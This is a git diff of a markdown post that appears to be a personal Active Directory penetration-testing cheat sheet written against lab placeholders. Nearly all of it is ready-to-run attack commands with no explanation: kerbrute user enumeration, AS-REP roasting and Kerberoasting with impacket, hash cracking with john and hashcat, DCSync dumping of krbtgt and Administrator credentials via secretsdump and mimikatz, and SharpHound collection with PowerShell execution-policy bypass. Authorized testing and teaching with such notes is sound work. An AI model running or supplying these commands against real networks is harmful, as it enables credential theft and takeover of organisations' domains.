@@ -18,20 +18,9 @@ layout: post
 Powershell:
 > [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent
 Domain()
-
 ```
 
 
-###### 389 LDAP query's
-```
-> ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
-> ldapsearch -LLL -x -H ldap://10.10.10.10 -b 'DC=DOMAIN,DC=LOCAL'
-```
-
-##### 3.. RPC Enumeration
-```
-
-```
 
 ###### Responder
 ```
@@ -56,49 +45,38 @@ Domain()
 > Get-NetSession -ComputerName dc01
 ```
 
+###### Kerberos ~ validating usernames
+```
+https://github.com/ropnop/kerbrute
+./kerbrute userenum --dc 10.10.10.10 -d domain.htb users
+```
+
 
 ###### Kerberos ~ AS-REP Roasting
 ```
-> impacket-GetNPUsers -format john -dc-ip 10.10.10.10 domain.local/username
->
+> impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
+> john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-###### Kerberos ~ TGS
+###### Kerberos ~ Kerberoasting
+```
+> GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
+
+> hashcat -m 13100 -a 0 tgsfile.out /usr/share/wordlists/rockyou.txt --force
+or:
+> python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
 ```
 
-```
-
-###### Kerberos ~ Rubeus syntax
-```
-
-```
-
-###### Kerberos with mimikatz
-```
-> sekurlsa::tickets
-> kerberos::list /export
-```
-
-
-###### Other Kerberos Commands
-```
-> klist
-
-> python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
-
-
-```
 
 ##### DS-SYNC attacks
 ```
 with impacket-secretsdump:
+> impacket-secretsdump domain/username:password@10.10.10.10
 
 with mimikatz:
-
 > Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
 > lsadump::dcsync /domain:domain.local /user:Administrator
 ```
-
 
 ###### Bloodhound
 ```
@@ -116,12 +94,12 @@ starts on localhost:7687
 Example bloodhound-python:
 > bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10
 
-Example sharphound
+Example SharpHound
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
-> import-module .\SharpHound.ps1
-> Invoke-Bloodhound -c All [-d domain.local]
+> Import-module .\SharpHound.ps1
+> Invoke-Bloodhound -CollectionMethod All [-d domain.local]
 Or at once:
-> powershell -exec bypass -command "& { Import-Module SharpHound.ps1; Invoke-Bloodhound -c All; }"
+> powershell -exec bypass -command "& { Import-Module SharpHound.ps1; Invoke-Bloodhound -CollectionMethod All; }"
 ```
 
 
